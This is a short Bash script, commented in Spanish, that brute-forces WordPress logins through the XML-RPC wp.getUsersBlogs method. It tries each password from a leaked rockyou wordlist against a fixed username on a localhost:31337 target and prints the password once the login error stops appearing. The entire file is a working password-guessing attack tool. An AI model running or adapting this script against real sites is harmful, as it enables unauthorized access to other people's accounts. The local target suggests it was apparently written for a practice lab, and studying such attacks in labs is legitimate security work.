#!/bin/bash
tput civis
trap ctrl_c INT
# Autor: Z0SO
# Este script es un script de fuerza bruta para el servicio XMLRPC de WordPress.

# Colores
red='\e[1;31m'
green='\e[0;32m'
blue='\e[1;34m'
yellow='\e[1;33m'
end='\e[0m'

ctrl_c() {
    echo -e "\n${red}[!] Saliendo...${end}"
    tput cnorm
    exit 1
}

# Función para crear el archivo XML
createxml() 
{
    password=$1

    this_xml="""
    <?xml version=\"1.0\" encoding=\"UTF-8\"?>
    <methodCall> 
    <methodName>wp.getUsersBlogs</methodName> 
    <params> 
    <param><value>zoso</value></param> 
    <param><value>$password</value></param> 
    </params> 
    </methodCall>
    """

    echo $this_xml > file.xml
    response=$(curl -s -X POST http://localhost:31337/xmlrpc.php -d@file.xml)
    
    if [ ! "$(echo $response | grep "Incorrect username or password")" ]; then
        echo -e "${green}[+] Contraseña encontrada: ${password}${end}"
        exit 1
    fi

}

main()
{
    cat ~/Documents/repos/hacking/SecLists/Passwords/Leaked-Databases/rockyou-45.txt  | while read password; do
        
        echo -e "${yellow}[*] Probando con la contraseña: ${password}${end}"
        createxml $password

    done

}


main

tput cnorm
